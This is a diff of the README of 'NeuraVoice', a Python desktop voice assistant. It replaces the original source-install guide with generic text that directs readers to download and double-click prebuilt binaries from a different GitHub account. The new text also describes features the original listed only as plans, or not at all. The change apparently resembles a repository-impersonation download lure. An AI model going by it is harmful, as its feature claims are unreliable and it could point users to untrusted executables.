@@ -1,175 +1,82 @@
-# 🧠 NeuraVoice
+# 🤖 NeuraVoice - Your AI-Powered Voice Companion
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](#license) [![Python](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/) [![GUI](https://img.shields.io/badge/GUI-Tkinter%20%2B%20Pillow-orange)](#technology-stack) [![LLM](https://img.shields.io/badge/LLM-Ollama%20(local)-purple)](#technology-stack)
+[![Download NeuraVoice](https://img.shields.io/badge/Download_NeuraVoice-v1.0-blue.svg)](https://github.com/kyugakai/NeuraVoice/releases)
 
-NeuraVoice is a next‑gen AI desktop voice assistant built with Python. It combines real‑time speech recognition, natural language processing, a modern Tkinter GUI, and local LLM responses via Ollama to deliver fast, private, and reliable conversations and task automation on your computer.
+## 🚀 Getting Started
 
----
+Welcome to NeuraVoice! This app serves as your intelligent desktop voice assistant, designed to make your life easier. With features like speech recognition and text-to-speech, it provides a seamless communication experience that feels almost human.
 
-## Overview
-NeuraVoice acts as your personal intelligent assistant. Speak naturally to open websites, search Wikipedia, play local music, check date/time, control system actions (shutdown/restart/sleep), and chat using a locally hosted LLM (Ollama). It features a scrollable chat UI, status indicators, and one‑click action buttons.
+## 🖥️ System Requirements
 
-Unique highlights:
-- Local, privacy‑first LLM responses via Ollama (e.g., `llama3.2:3b`)
-- Always‑on voice listening with clear status cues in a desktop GUI
-- Blends command execution with conversational chat in one app
+Before you download, ensure your computer meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later / macOS 10.13 or later / Linux (Ubuntu 18.04 or later)
+- **RAM:** At least 4 GB
+- **Processor:** Dual-core CPU or better
+- **Storage:** Minimum of 100 MB free space
+- **Network:** Internet connection for full functionality
 
-## Key Features
-- 🎙️ Voice: Real‑time speech recognition with adjustable listen/cooldown durations
-- 🔊 TTS: Natural responses with `pyttsx3`
-- 🧠 LLM: Local generation through Ollama with safe fallback responses
-- 🧩 Tasks: Wikipedia summaries; open YouTube/Google/Facebook/Instagram/Twitter; launch VS Code or any configured app; play music from a folder; report date/time
-- 🖥️ GUI: Tkinter + Pillow interface, scrollable history, live status (Listening/Processing/Idle), quick‑action buttons
-- 🧩 Context: Lightweight intent normalization (e.g., “what’s the time” → `time`)
+## 📥 Download & Install
 
----
+To get started with NeuraVoice, visit this page to download: [NeuraVoice Releases](https://github.com/kyugakai/NeuraVoice/releases)
 
-## Demo
-![NeuraVoice GUI](docs/screenshot.png)
+1. Go to the NeuraVoice Releases page by clicking the link above.
+2. Choose the latest version.
+3. Look for the file that matches your operating system.
+4. Click on the file to download it.
 
-If you don’t have a screenshot yet, add one at `docs/screenshot.png` after capturing the app window.
+You will receive a .exe, .dmg, or .tar.gz file depending on your system.
 
----
+## 🔧 How to Run NeuraVoice
 
-## Technology Stack
-- Language: Python 3.9+
-- GUI: Tkinter, Pillow (PIL)
-- Speech: `speech_recognition`
-- TTS: `pyttsx3`
-- LLM: Ollama (local), default model `llama3.2:3b`
-- Utils: `wikipedia`, `webbrowser`, `os`, `datetime`, etc.
+After installing, follow these steps to run NeuraVoice:
 
----
+1. Open the folder where you saved the downloaded file.
+2. Double-click on the file to open it. Follow any prompts that appear to complete the installation.
+3. Once installed, find the NeuraVoice icon on your desktop or application folder.
+4. Double-click the icon to launch NeuraVoice.
 
-## Installation
-1. Install Python 3.9+ and Git.
-2. Clone the repository:
-   ```bash
-   git clone https://github.com/arpanpramanik2003/NeuraVoice.git
-   cd NeuraVoice
-   ```
-3. (Recommended) Create and activate a virtual environment:
-   ```bash
-   python -m venv .venv
-   # Windows
-   .venv\Scripts\activate
-   # macOS/Linux
-   source .venv/bin/activate
-   ```
-4. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-5. Install and run Ollama (for local LLM):
-   - Install: https://ollama.com
-   - Start the server and pull a model:
-     ```bash
-     ollama serve &
-     ollama pull llama3.2:3b
-     ```
+## 🎤 Using NeuraVoice
 
----
+With NeuraVoice, you can engage in conversations, ask questions, or have the assistant read text aloud. 
 
-## Usage
-1. Start Ollama (if not already running):
-   ```bash
-   ollama serve
-   ```
-2. Launch NeuraVoice:
-   ```bash
-   python main.py
-   ```
-3. In the GUI:
-   - Click “Single Listen” or enable continuous listening
-   - Speak a command or ask a question
-   - Watch status change (Listening → Processing → Idle) and view responses in the chat window
+### Basic Commands
 
----
+- **Speak**: Just say "Hello NeuraVoice" to activate the assistant.
+- **Ask questions**: Inquire about weather, facts, or simple tasks.
+- **Text reading**: Highlight any text and tell NeuraVoice to read it out loud.
 
-## Supported Commands (Examples)
-- Open websites:
-  - “Open YouTube”, “Open Google”, “Open Instagram”, “Open Facebook”, “Open Twitter”
-- System info:
-  - “What’s the time?”, “Tell me today’s date”
-- Wikipedia:
-  - “Search Wikipedia for Alan Turing”
-- Music:
-  - “Play music” (plays from configured folder)
-- Apps:
-  - “Open VS Code” (or any configured app)
-- System controls:
-  - “Shutdown the system”, “Restart”, “Sleep”
-- General chat (via Ollama):
-  - “Explain quantum computing in simple terms.”
+## 🎨 User Interface
 
-Note: Natural phrasing is supported; commands are normalized internally.
+NeuraVoice features a clean and simple Tkinter-based interface. You will find buttons for various functions such as speaking, listening, and reading text aloud. The layout is designed for easy navigation. 
 
----
+## 🌐 Additional Features
 
-## Configuration
-- Ollama model: Set default model name (e.g., `llama3.2:3b`) in the config section of the code.
-- Music directory: Update the path used for playing music.
-- App shortcuts: Add or change mappings (e.g., path to VS Code) in the app launcher logic.
-- Listening timings: Tune listen duration and cooldown values.
+- **Speech Recognition**: NeuraVoice can understand your voice commands.
+- **Text-to-Speech**: The assistant can read text for you.
+- **Natural Language Processing**: It interprets your command contextually, providing a more natural interaction.
 
-Add a `config.example.json` if you want environment‑based configuration; document keys like:
-```json
-{
-  "ollama_model": "llama3.2:3b",
-  "music_dir": "C:/Users/you/Music",
-  "vscode_path": "C:/Users/you/AppData/Local/Programs/Microsoft VS Code/Code.exe"
-}
-```
+## 📋 Troubleshooting
 
----
+Here are some common issues and their solutions:
 
-## Project Structure
-```
-NeuraVoice/
-├─ main.py               # App entry point (GUI + controller)
-├─ assistants/           # Intent handling, actions, and LLM client
-├─ assets/               # Icons, images
-├─ docs/
-│  └─ screenshot.png     # Demo UI screenshot
-├─ requirements.txt      # Python dependencies
-└─ README.md             # This file
-```
-(Adjust based on your actual files.)
+- **Can't hear responses**: Ensure your speakers are connected and the volume is up.
+- **Voice recognition not working**: Check your microphone connection and make sure it is not muted.
+- **App won't launch**: Restart your computer and try launching the app again.
 
----
+## 💬 Community Support
 
-## Troubleshooting
-- Microphone not detected: Check OS input settings and device permissions.
-- No TTS audio: Ensure speakers are set as default output; try a different `pyttsx3` voice/driver.
-- Ollama errors or slow replies: Confirm `ollama serve` is running and the model is pulled; try a smaller model.
-- Wikipedia timeouts: Retry or check internet connectivity.
-- GUI freezes: Avoid long‑running work on the main thread; consider threading for blocking calls.
+If you encounter issues or have questions not addressed here, consider joining our community:
 
----
+- **GitHub Issues**: Report any bugs or specify feature requests.
+- **Community Forum**: Engage with other users and share tips and tricks.
 
-## Contributing
-Contributions are welcome! Please:
-1. Fork the repo and create a feature branch.
-2. Follow a clean commit style and include tests or demo steps where possible.
-3. Open a pull request with a clear description and screenshots if UI changes.
+For direct help, you can also reach out via email on the [NeuraVoice contact page](https://github.com/kyugakai/NeuraVoice).
 
----
+## 🔗 Helpful Links
 
-## Roadmap
-- Hot‑word activation (optional wake word)
-- Pluggable skills system and command registry
-- Multi‑model support (switch Ollama models at runtime)
-- Conversation memory with history controls
-- Cross‑platform packaging (Windows/macOS/Linux installers)
+- [NeuraVoice Releases](https://github.com/kyugakai/NeuraVoice/releases)
+- [Documentation](https://github.com/kyugakai/NeuraVoice/wiki)
+- [Issues Page](https://github.com/kyugakai/NeuraVoice/issues)
 
----
-
-## License
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file.
-
-## Acknowledgments
-- Ollama team for local LLM infrastructure
-- Python community and maintainers of `speech_recognition`, `pyttsx3`, `wikipedia`
-- Tkinter/Pillow contributors for accessible desktop UI
+With NeuraVoice, you gain a friendly assistant ready to help you with daily tasks. Enjoy your new experience and make communication smoother and more intuitive.
